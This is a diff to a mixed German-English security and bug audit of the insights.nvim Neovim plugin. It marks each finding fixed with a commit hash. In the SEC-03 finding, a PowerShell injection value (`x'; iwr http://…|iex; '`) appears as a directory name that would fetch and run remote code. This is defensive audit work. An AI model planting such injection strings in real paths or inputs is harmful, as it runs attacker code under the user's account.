@@ -33,7 +33,7 @@ Befunde ohne Status-Zeile sind offen. Jeder Plugin-Header trägt zusätzlich
 | mdview.nvim | 18 | 18 | 0 | fertig (2026-09-18) |
 | replacer.nvim | 17 | 17 | 0 | fertig (2026-09-18) |
 | buffer-ctx.nvim | 16 | 16 | 0 | fertig (2026-09-18) |
-| insights.nvim | 16 | – | – | offen |
+| insights.nvim | 16 | 16 | 0 | fertig (2026-09-18) |
 | language.nvim | 16 | – | – | offen |
 | debugging.nvim | 15 | – | – | offen |
 | pdfport.nvim | 15 | – | – | offen |
@@ -1318,7 +1318,7 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 
 ## insights.nvim
 
-**16 Befunde** (8 × high). Roh gemeldet: 16.
+**16 Befunde** (8 × high). Roh gemeldet: 16. — **Stand: 16/16** (⏭️ 0, 2026-09-18)
 
 ### `ERR-10` — „Kein Argument" ≠ „ungültiges Argument"
 
@@ -1330,6 +1330,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 
 **Auswirkung.** Confirmed. `conflicts.events = {}` — the opt-out both the defaults comment and docs/configuration.md tell the user to write — still registers the VimEnter autocmd, so every Neovim start runs `conflicts.run_async`. That is async (the comment at lines 46-48 shows the blocking version was deliberately replaced), so the impact is a background git scan plus a possible quickfix-list replacement and notification on startup, not the ~120ms main-loop block the old implementation had. `unimported.events = {}` likewise keeps the BufWritePost check on every write. Worth flagging that the spec test encodes the documented behavior's opposite, so any fix has to correct DEFAULTS.lua:164, docs/configuration.md:164 and bindings_spec.lua:157-159 together.
 
+**Status.** ✅ erledigt (`add483d`) — `norm_events` respektiert jetzt eine explizit leere Events-Liste statt sie wie „nicht gesetzt“ zu behandeln.
+
 ### `ERR-11` — „Nichts zu melden" ≠ „Fehler beim Ermitteln"
 
 `lua/insights/imports/init.lua:126` · `candidate_files` · confidence **high**
@@ -1339,6 +1341,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 **Regelbezug.** ERR-11: a function whose result may legitimately be empty must keep "empty and fine" distinguishable from "empty because it broke". Here rg exit 0 (files found), exit 1 (no matches) and the sentinel -1 (wedged/timed-out process, default 120 s) all collapse into the same silent empty list — and unlike exit code 2, -1 does not even fall through to the globpath fallback below.
 
 **Auswirkung.** Confirmed. Three distinct outcomes — rg exit 0 (matches), exit 1 (no matches) and the `-1` timeout/wedged sentinel — collapse into one empty candidate list. On a tree where rg exceeds `symbols.indexing.timeout_ms`, `:Insights imports` reports 'no import/require calls found' rather than naming the scan failure, and the empty result is written to `imports.index` by both scan entry points, so `:Insights imports reverse <module>` and the hover.nvim contribution subsequently answer 'nobody imports this' from a scan that never completed. The one correction to the auditor: exit code 2 does fall through to the globpath fallback, so the gap is specific to the timeout sentinel.
+
+**Status.** ✅ erledigt (`ab16469`) — Ein Timeout des `rg`-Vorfilters wird nicht mehr als „keine Kandidaten“ missverstanden.
 
 ### `LUA-01` — Hart oder weich, aber konsistent
 
@@ -1350,6 +1354,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 
 **Auswirkung.** A user who takes the documented opt-out — `devserver.prompt = false`, ui.nvim not installed — hits `module 'ui.kit' not found` on `:Insights metrics`, `:Insights smells`, every `:Insights imports` variant and `:Insights symbols … scratch`, because the failing require is at scratch.lua's top level and fires on the first `require("insights.ui.scratch")`, before any code path decides whether the help viewer is needed. `:checkhealth insights` compounds it by attributing the missing module solely to the dev-server prompt, so the health output actively points away from the real cause.
 
+**Status.** ✅ erledigt (`9fac7d3`) — `ui.kit` ist im Scratch-Report-Viewer jetzt eine weiche statt einer harten Abhängigkeit.
+
 ### `PERF-46` — Cache-Key vollständig
 
 `lua/insights/scan/cache.lua:13` · `cache_path` · confidence **high**
@@ -1359,6 +1365,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 **Regelbezug.** PERF-46: the key must contain every parameter that influences the result, otherwise the cache silently answers a different configuration's question. Only source-file mtimes invalidate here (cache.lua:53-59) — flipping a config flag changes no file's mtime, so the stale entry stays valid for the full 3600 s TTL.
 
 **Auswirkung.** Accurate as written and verified in both directions. With `symbols.use_treesitter_for_lua = true` against a cache warmed by an rg-only run, `:Insights symbols` returns the cached rg Lua entries *plus* the fresh Tree-sitter ones — every Lua function appears twice in the picker. After a TS-mode run persists the Lua-free index under the shared key, switching back to the rg backend shows zero Lua symbols until the TTL (default 3600s) lapses, a source file's mtime changes, or `:Insights cache clear` runs. The same applies to any `symbols.languages.<lang> = false` flip and to changes in `indexing.exclude_patterns` / `max_file_size_kb`, none of which are in the key.
+
+**Status.** ✅ erledigt (`e9e186c`) — Sprach-/Indexierungs-Konfiguration fließt jetzt in den Cache-Key ein — zwei unterschiedliche Konfigurationen teilen sich nicht mehr denselben Symbols-Cache.
 
 ### `SEC-03` — Nutzereingabe nie shell-interpoliert
 
@@ -1370,6 +1378,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 
 **Auswirkung.** On Windows, any project directory or outdir containing an apostrophe terminates the PowerShell string literal early: `Get-ChildItem -Recurse -Path 'C:\Bob's Repo'` is a parse error, so `:Insights compress` fails with an opaque 'file listing failed' for an ordinary, legal Windows directory name — this is the realistic, routine failure. The injection case is real but narrower than stated: it requires an attacker-chosen directory name (e.g. a cloned repo checked out under `x'; iwr http://…|iex; '`) or an attacker-supplied `outdir` argument, and then arbitrary PowerShell runs under the user's account. Note `args[2]` is additionally never passed through `expand_path` — usrcmds.lua:285 splices it into the config table raw, so it reaches both `vim.fn.expand` (compress/init.lua:42) and this command string unsanitized.
 
+**Status.** ✅ erledigt (`d4d0969`) — Single Quotes in den PowerShell-Kommandostrings der Compress-Engine werden jetzt escaped.
+
 ### `SEC-30` — Nutzereingabe literal escapen
 
 `lua/insights/tree/init.lua:66` · `build_tree_cmd` · confidence **high**
@@ -1379,6 +1389,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 **Regelbezug.** SEC-30 requires user-derived input to be literal-escaped for the regex engine that will actually read it. `sed` BRE escapes with `\`, not `%`; `%` is an ordinary literal character there. This is the identical mistake the Windows branch of this same function documents as already fixed in its comment (lines 79-85: "The replacement below used to prepend a literal `%` to each one") — the sed branch was never corrected.
 
 **Auswirkung.** Confirmed for Unix `:Insights tree` / `:Insights count`. A cwd containing a space, `+`, `&`, `(` etc. produces a pattern like `s#^/home/u/my% project/##` that can never match, so the output file lists absolute paths instead of project-relative ones — a silent, wrong-looking tree, not an error. A cwd containing the `#` delimiter itself (`s#^/a/b%#/##`) or an unbalanced `[` makes sed abort with a syntax error and `:Insights tree` reports 'tree write failed'. The auditor's `[`/`]` example is imprecise — a balanced `[test]` escapes to `%[test%]`, which sed parses as a valid bracket expression that simply does not match, rather than erroring; only an unbalanced bracket aborts. The false-prefix-match concern is real but minor.
+
+**Status.** ✅ erledigt (`68d7da2`) — Der Unix-Root-Prefix-Strip escaped jetzt korrekt für sed BRE statt für Lua-Patterns.
 
 ### `SEC-34` — `vim.fn.expand()` nie auf Buffer-/Nutzertext
 
@@ -1390,6 +1402,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 
 **Auswirkung.** A backtick span in the argument to `:Insights compress` is executed by `&shell` before anything is compressed, exactly as SEC-34 documents for `vim.fn.expand`. The Vim-specials half is narrower than the auditor implies: Vim only treats `%`/`#`/`<…>` as specials when they are the *first* character of the string, so it is an argument that literally begins with `%` or `#` (a directory named `%`) that silently resolves to the current/alternate file name and archives the wrong tree. Mid-string `%` is left alone.
 
+**Status.** ✅ erledigt (`aa3cc05`) — `vim.fn.expand()` durch `lib.nvim.cross.fs.expand_path` ersetzt (kein Shell, keine Vim-Specials) — an allen verbleibenden Stellen inkl. `handle_compress`, `metrics.normalize_dir` und `compress.resolve_outdir` in einem Commit.
+
 ### `SEC-34` — `vim.fn.expand()` nie auf Buffer-/Nutzertext
 
 `lua/insights/metrics/init.lua:24` · `M.normalize_dir` · confidence **high**
@@ -1399,6 +1413,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 **Regelbezug.** SEC-34: the directory token comes from the user's command line, so a backtick span in it is executed by `&shell` inside `expand()`, and `%`/`#` are expanded as Vim specials rather than treated as path characters. `lib.nvim.cross.fs.expand_path` is the sanctioned no-shell, no-globbing replacement and is already used elsewhere in this plugin.
 
 **Auswirkung.** A backtick span in the directory token of `:Insights metrics` or `:Insights smells` is run through `&shell` by `expand()` before the analysis starts. The specials case is limited to a token that *begins* with `%` or `#` (Vim only honours cmdline-special expansion at position 0), which then resolves to the current/alternate file name, so `vim.fn.isdirectory(root)` fails and the user gets 'not a directory: <some file>' rather than a silent wrong-tree scan — less silent than the auditor claims, but still a wrong resolution of a path the user named literally.
+
+**Status.** ✅ erledigt (`aa3cc05`) — Gleicher Fix wie #7, hier `metrics/init.lua`s `M.normalize_dir`.
 
 ### `ERR-10` — „Kein Argument" ≠ „ungültiges Argument"
 
@@ -1410,6 +1426,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 
 **Auswirkung.** Confirmed — this is ERR-10's archetype, and the plugin's own `symbols/open.lua` already implements the correct behavior for the config-side equivalent. `:Insights symbols buffr` falls through to the `scope = "cwd"` default and runs a full ripgrep index of the working tree instead of scanning the one buffer, presenting the result as though it were what was asked for; on a large repo that is a multi-second scan the user did not request. `:Insights symbols rebiuld` leaves `rebuild = false`, so the requested rebuild silently does not happen and a stale cache is served. A mistyped symbol type (`tabels`) silently yields functions. In every case the widening is the failure mode the rule was written to catch.
 
+**Status.** ✅ erledigt (`e39527e`) — `handle_symbols` meldet einen unbekannten Token jetzt als Fehler statt ihn stillschweigend auf die cwd/functions-Defaults zurückfallen zu lassen.
+
 ### `ERR-10` — „Kein Argument" ≠ „ungültiges Argument"
 
 `lua/insights/bindings/usrcmds.lua:204` · `parse_metrics_args` · confidence **medium**
@@ -1419,6 +1437,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 **Regelbezug.** ERR-10: an invalid argument value is collapsed onto "no argument", which is precisely the case the rule says must be returned separately. Nothing warns.
 
 **Auswirkung.** Confirmed. `:Insights metrics --topn=2o` or `--colwidth=wide` silently discards the flag and renders the report with the configured defaults, byte-identical to a run where the flag was never typed — the user reads top-N lists and a column width they did not ask for with no signal that their argument was rejected. This is the narrowest of the three ERR-10 findings in this report: unlike `handle_symbols`, the operation is not widened and nothing expensive or destructive happens, so the cost is purely a misleading report the user has no way to distrust.
+
+**Status.** ✅ erledigt (`e39527e`) — `parse_metrics_args` meldet einen nicht-numerischen `--topn=`/`--colwidth=`-Wert jetzt statt ihn wie „nicht gesetzt“ zu behandeln.
 
 ### `ERR-11` — „Nichts zu melden" ≠ „Fehler beim Ermitteln"
 
@@ -1430,6 +1450,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 
 **Auswirkung.** Confirmed. A cache file that exists but cannot be parsed — the `invalid JSON` case that M.load already names correctly — is reported by `:Insights cache info` and by the Symbol cache section of `:checkhealth insights` as 'no cache for current CWD — run :Insights cache build'. The user is told to build a cache they already have, the corruption is never named, and `:checkhealth` — the one surface whose job is to reveal exactly this — reports the wrong condition. The fix is a one-line change since M.load next door already demonstrates the (result, reason) shape.
 
+**Status.** ✅ erledigt (`1f3ea8e`) — `M.stats` unterscheidet jetzt „kein Cache“ von „Cache vorhanden aber unlesbar/korrupt“.
+
 ### `ERR-22` — Ungültiger Config-Wert degradiert auf Default
 
 `lua/insights/config/init.lua:25` · `expand_paths` · confidence **medium**
@@ -1439,6 +1461,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 **Regelbezug.** ERR-22: an invalid single config value must degrade to its default instead of aborting plugin initialisation. `vim.tbl_deep_extend("force", …)` replaces a whole sub-table when the user passes a scalar, so a plausible mistake — writing `compress = false` by analogy with the top-level `hover = false`/`commands = false`/`deps_popup = false` switches this plugin does have — leaves `current.compress == false` and line 29 raises "attempt to index a boolean value". Every consumer elsewhere in the plugin guards for exactly this (`cfg.imports and cfg.imports.enable`, `cfg.conflicts or {}`); only the merge path does not.
 
 **Auswirkung.** Confirmed. `require("insights").setup({ compress = false })` — or `symbols`, `tree`, `metrics`, `imports` given a scalar — throws out of `setup()` at config/init.lua:25-31 before `bindings` registers any command, keymap or autocmd, so a single mistyped option leaves the plugin entirely inert rather than degrading that one value to its default. Under lazy.nvim the error surfaces as a plugin-load failure in the lazy UI, which points at the plugin rather than at the offending line of the user's spec. ERR-22's second half is also unmet: nothing in `:checkhealth insights` surfaces a rejected value, because setup never returns.
+
+**Status.** ✅ erledigt (`49128cf`) — Config-Werte werden vor dem Merge validiert, ein fehlerhafter Einzelwert degradiert auf den Default.
 
 ### `ERR-50` — Config-Validierung vor dem Merge
 
@@ -1450,6 +1474,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 
 **Auswirkung.** Confirmed, and the consequence is precisely the silent-typo case the rule names. With `"force"` deep-extend, `setup({ symbols = { langauges = { lua = true } } })` merges the misspelled key into the resulting table where nothing ever reads it, and `setup({ imports = { engien = "ripgrep" } })` does the same. No error, no warning, and `:checkhealth insights` cannot surface it because it only prints resolved values. The user's only signal is that the plugin behaves as though they configured nothing — with no way to tell a typo from an option that does not do what they expected. The impact is a diagnosability gap rather than a crash, which matches the rule's medium-severity framing.
 
+**Status.** ✅ erledigt (`49128cf`) — `M.setup` prüft unbekannte Keys vor dem Merge (gemeinsamer Commit mit #12).
+
 ### `ERR-54` — Getter auf geteiltem Zustand: Kopie oder dokumentierte Live-Referenz
 
 `lua/insights/devserver/init.lua:27` · `M.tracked` · confidence **medium**
@@ -1460,6 +1486,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 
 **Auswirkung.** I have to correct the auditor here: the concrete breakage they describe does not occur today. Nothing inside insights.nvim mutates the returned table — `handle_devserver` (usrcmds.lua:377) only reads it — so there is no live bug, and the statusline snippet in the impact text is invented. What is real is the exposure the rule is written against: `insights.devservers()` is a documented public API, so any external consumer that clears an entry or rewrites the table (the natural thing to do for a channel it considers dead) silently removes that server from the plugin's own tracking, and `kill_all` on VimLeavePre then skips a process the user answered 'yes' to killing. Severity is latent, not observed — the correct framing is 'undocumented live reference handed across a public API boundary', not a present-day defect.
 
+**Status.** ✅ erledigt (`5144809`) — `M.tracked()` gibt jetzt eine Kopie zurück statt der Live-Referenz — ein Aufrufer, der das Ergebnis sortiert/filtert, korrumpiert nicht mehr den Tracking-Zustand, den `M.track`/`M.kill_all` lesen und schreiben.
+
 ### `SEC-33` — Persistierte Snapshots sind untrusted
 
 `lua/insights/scan/cache.lua:53` · `M.load` · confidence **medium**
@@ -1469,6 +1497,8 @@ SMALLER THINGS I JUDGED BELOW THE REPORTING BAR (no confirmed breakage, listed s
 **Regelbezug.** SEC-33: a persisted snapshot is untrusted on load and every field must be re-validated on the way in. A JSON `null` decodes to `vim.NIL` (userdata, truthy), so `ie.entry and ie.entry.filename or ""` passes it straight to `uv.fs_stat`, which raises on a non-string; `entries` being a non-list, or `entry` a scalar, is equally unhandled.
 
 **Auswirkung.** The violation is real but the auditor's mechanism and the 'truncated file' half are both wrong, so the impact needs restating. A truncated cache file is actually handled cleanly: `lib.nvim.fs.json.read` returns `nil, "invalid JSON: …"` and M.load's line 35-37 turns that into a proper `(nil, reason)` miss. And JSON null does not arrive as `vim.NIL` — `lib.nvim.json.decode` normalizes it to the `lib.lua.null.NULL` table sentinel (lib.nvim/lua/lib/nvim/json/init.lua:59-61). That sentinel is still truthy and still not a string, so the outcome the auditor predicted holds by a different route: a *syntactically valid* cache file with a null or wrong-typed `filename` (or a scalar `entry`, or a non-list `entries`) makes `uv.fs_stat` raise 'string expected, got table' out of an uncaught `cache.load`, and `:Insights symbols` errors instead of falling back to a rebuild. The uncapped entry count and the unvalidated `lnum` reaching `nvim_win_set_cursor` are both confirmed as stated.
+
+**Status.** ✅ erledigt (`745e7da`) — `M.load` validiert jetzt Typ/Form jedes geladenen Cache-Eintrags (filename muss ein nicht-leerer String sein, lnum/col müssen Zahlen sein, entries muss eine Liste sein, Count-Cap bei 20000) bevor sie vertraut werden — ein `uv.fs_stat`-Absturz auf einem `null`-Filename oder einer nicht-Listen-`entries` ist jetzt ein sauberer Cache-Miss statt eines Crashes. Ganzer Cache wird bei erstem fehlerhaften Eintrag verworfen, analog zur bestehenden Version/CWD/TTL-Invalidierung.
 
 ### `SEC-34` — `vim.fn.expand()` nie auf Buffer-/Nutzertext
 
@@ -1491,6 +1521,8 @@ CMT-16 not checked: docs/map/ and docs/BINDINGS.md are generated artefacts, but 
 Rules with a surface but no finding: LUA-11/12/13 and ERR-33 (handles are re-validated — hover.lua:120, unimported/init.lua:69, fileinfo/init.lua:50/62, ts_lua.lua:55); PERF-80 (conflicts/init.lua:181, graph.lua:151 and util/platform.lua:33 all `vim.schedule` before touching the API); SEC-35 (every `vim.cmd("edit …")` goes through `vim.fn.fnameescape`, which escapes `|`); SEC-30 elsewhere (`vim.pesc` is used in definition.lua:141 and imports/init.lua's `count_word`, and unimported's component names are constrained to `[A-Z][%w_]*`); ERR-51 (setup merges into `vim.deepcopy(defaults)`); XP-01 (every `glob`/`globpath` call goes through `lib.nvim.fs.globbable`).
 
 One observation with no matching rule, so not filed as a finding: symbols/ts_lua.lua:195-196, ts_lua_tables.lua:210-211 and ts_lua_strings.lua:105-106 each do `vim.fn.bufadd(path)` + `vim.fn.bufload(path)` for every .lua file in the tree and never unload them, so `:Insights symbols tables cwd` (reachable with default config) leaves the whole project loaded as buffers for the rest of the session and fires every BufRead/FileType autocmd other plugins have registered.
+
+**Status.** ✅ erledigt (`aa3cc05`) — Gleicher Fix wie #7/#8, hier `compress/init.lua`s `resolve_outdir` (im selben Commit mitbehoben).
 
 ---
 
